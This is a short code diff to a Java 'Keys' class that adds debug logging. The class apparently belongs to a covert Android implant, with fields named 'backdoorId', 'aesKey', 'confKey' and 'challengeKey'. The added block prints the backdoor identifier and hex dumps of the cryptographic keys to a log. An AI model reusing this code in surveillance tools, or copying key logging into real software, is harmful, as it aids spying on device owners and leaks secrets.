@@ -16,6 +16,7 @@ import com.android.service.Device;
 import com.android.service.R;
 import com.android.service.Status;
 import com.android.service.auto.Cfg;
+import com.android.service.util.Check;
 import com.android.service.util.Utils;
 
 // This class should only be read by Device
@@ -23,7 +24,7 @@ import com.android.service.util.Utils;
  * The Class Keys.
  */
 public class Keys {
-
+	private static final String TAG = "Keys";
 	/** The singleton. */
 	private volatile static Keys singleton;
 
@@ -76,6 +77,15 @@ public class Keys {
 			aesKey = keyFromString(resource, 14, 32);
 			confKey = keyFromString(resource, 46, 32);
 			challengeKey = keyFromString(resource, 78, 32);
+
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " backdoorId: "
+						+ backdoorId);
+				Check.log(TAG + " aesKey: " + Utils.byteArrayToHex(aesKey));
+				Check.log(TAG + " confKey: " + Utils.byteArrayToHex(confKey));
+				Check.log(TAG + " challengeKey: "
+						+ Utils.byteArrayToHex(challengeKey));
+			}
 
 		}
 
